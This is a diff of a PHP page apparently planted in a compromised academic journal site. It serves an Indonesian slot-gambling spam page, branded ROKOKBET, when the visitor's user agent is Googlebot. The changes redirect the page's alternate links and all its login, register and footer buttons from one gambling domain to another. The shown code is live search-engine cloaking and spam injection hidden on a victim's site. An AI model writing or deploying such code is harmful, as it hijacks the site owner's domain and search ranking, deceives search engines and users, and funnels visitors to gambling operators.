@@ -17,14 +17,14 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
 <meta name="title" content="Wew ! ROKOKBET Pelaku Situs Slot Gacor Online Terbaik Mudah Maxwin 2026!">
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://journal.aishaedu.org/">
-<link rel="amphtml" href="https://whoami-situsslotgacor.pages.dev/">
-<link rel="alternate" hreflang="id-id" href="https://whoami-situsslotgacor.pages.dev/" />
-<link rel="alternate" href="https://whoami-situsslotgacor.pages.dev/" />
-<link rel="alternate" hreflang="id" href="https://whoami-situsslotgacor.pages.dev/" />
-<link rel="alternate" hreflang="en" href="https://whoami-situsslotgacor.pages.dev/" />
-<link rel="alternate" hreflang="x-default" href="https://whoami-situsslotgacor.pages.dev/" />
-<link rel="alternate" media="only screen and (max-width: 640px)" href="https://whoami-situsslotgacor.pages.dev/" />
-<link rel="alternate" media="handheld" href="https://whoami-situsslotgacor.pages.dev/" />
+<link rel="amphtml" href="https://aishaedu.jktborn.store/">
+<link rel="alternate" hreflang="id-id" href="https://aishaedu.jktborn.store/" />
+<link rel="alternate" href="https://aishaedu.jktborn.store/" />
+<link rel="alternate" hreflang="id" href="https://aishaedu.jktborn.store/" />
+<link rel="alternate" hreflang="en" href="https://aishaedu.jktborn.store/" />
+<link rel="alternate" hreflang="x-default" href="https://aishaedu.jktborn.store/" />
+<link rel="alternate" media="only screen and (max-width: 640px)" href="https://aishaedu.jktborn.store/" />
+<link rel="alternate" media="handheld" href="https://aishaedu.jktborn.store/" />
 <meta name="publisher" content="ROKOKBET">
 <meta name="description" content="Wew! ROKOKBET hadir sebagai situs slot gacor online terbaik 2026 dengan peluang maxwin mudah, akses cepat, dan pengalaman bermain yang seru serta terpercaya.">
 <meta name="keywords" content="ROKOKBET, ROKOKBET, ROKOKBET resmi, ROKOKBET slot, ROKOKBET jitu, ROKOKBET gacor" />
@@ -4092,8 +4092,8 @@ digitalData.page.pageInfo.pageName = pageName;
         <!-- CTA Buttons - Gold Version (tanpa animasi slot) -->
         <div class="cta-gold-section">
             <div class="cta-buttons-gold">
-                <a href="https://whoami-situsslotgacor.pages.dev/" rel="nofollow noreferrer" class="btn-gold btn-login-gold" title="Masuk akun">LOGIN</a>
-                <a href="https://whoami-situsslotgacor.pages.dev/" rel="nofollow noreferrer" class="btn-gold btn-register-gold" title="Daftar sekarang">DAFTAR</a>
+                <a href="https://aishaedu.jktborn.store/" rel="nofollow noreferrer" class="btn-gold btn-login-gold" title="Masuk akun">LOGIN</a>
+                <a href="https://aishaedu.jktborn.store/" rel="nofollow noreferrer" class="btn-gold btn-register-gold" title="Daftar sekarang">DAFTAR</a>
             </div>
         </div>
     </div>
@@ -6665,17 +6665,17 @@ digitalData.page.pageInfo.pageName = pageName;
             <div class="footer-category__list-wrap">
               <ul class="footer-category__list" role="list">
                 <li class="footer-category__item" role="listitem">
-                  <a class="footer-category__link" href="https://whoami-situsslotgacor.pages.dev/">
+                  <a class="footer-category__link" href="https://aishaedu.jktborn.store/">
                     Login Member
                   </a>
                 </li>
                 <li class="footer-category__item" role="listitem">
-                  <a class="footer-category__link" href="https://whoami-situsslotgacor.pages.dev/">
+                  <a class="footer-category__link" href="https://aishaedu.jktborn.store/">
                     Daftar Akun Baru
                   </a>
                 </li>
                 <li class="footer-category__item" role="listitem">
-                  <a class="footer-category__link" href="https://whoami-situsslotgacor.pages.dev/">
+                  <a class="footer-category__link" href="https://aishaedu.jktborn.store/">
                     Lupa Password
                   </a>
                 </li>
@@ -10544,9 +10544,9 @@ digitalData.page.pageInfo.pageName = pageName;
         <div class="slot">
             <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBrIgyL8JGQGbuDSOFp1S7ckimfgE8TAzYQkIE87J6oQ0BX-vbPSNjT9_hYDuhRpWVdQrI1jKCMUnu_UDDSzZLrtzOdUHQGTOap0m7rI6CWXzudMTO2Lyw8w0h0veOxtFDW5npi7u22WxmIR1hTTJpRTM_1vOrE7v-Ei4UEx8iEFq7fLCmBMXjZWBRY7KJ/s1254/55926aa2-b85f-41da-99b6-2250dd04e47e.jpg" alt="Popup Banner" class="popup-image" />
             <div class="clk-btn-sgp" style="font-size: 20px;">
-                <a href="https://whoami-situsslotgacor.pages.dev/" target="_blank" rel="nofollow noreferrer"
+                <a href="https://aishaedu.jktborn.store/" target="_blank" rel="nofollow noreferrer"
                     class="login">LOGIN</a>
-                <a href="https://whoami-situsslotgacor.pages.dev/" target="_blank" rel="nofollow noreferrer"
+                <a href="https://aishaedu.jktborn.store/" target="_blank" rel="nofollow noreferrer"
                     class="register">DAFTAR</a>
             </div>
             <div class="popup-footer">
@@ -10595,6 +10595,7 @@ digitalData.page.pageInfo.pageName = pageName;
 exit;
 }
 ?>
+
 <?php
 
 /**
